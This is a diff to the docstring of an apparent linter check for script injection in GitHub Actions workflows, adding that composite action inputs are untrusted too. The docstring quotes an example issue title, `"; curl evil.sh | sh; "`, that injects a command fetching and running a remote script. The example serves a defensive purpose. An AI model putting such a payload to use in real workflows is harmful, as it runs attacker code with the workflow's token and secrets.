@@ -41,7 +41,9 @@ def check(ctx: Context) -> Iterable[Finding]:
 
     Why it matters: GitHub substitutes `${{ ... }}` into the script text before
     the shell runs it. An issue titled `"; curl evil.sh | sh; "` then becomes
-    shell code that runs with the workflow's token and secrets.
+    shell code that runs with the workflow's token and secrets. In a composite
+    action, `${{ inputs.* }}` counts as untrusted too: the calling workflow sets
+    it and may pass event data straight through.
 
     Fix: pass the value through an environment variable and quote it.
 
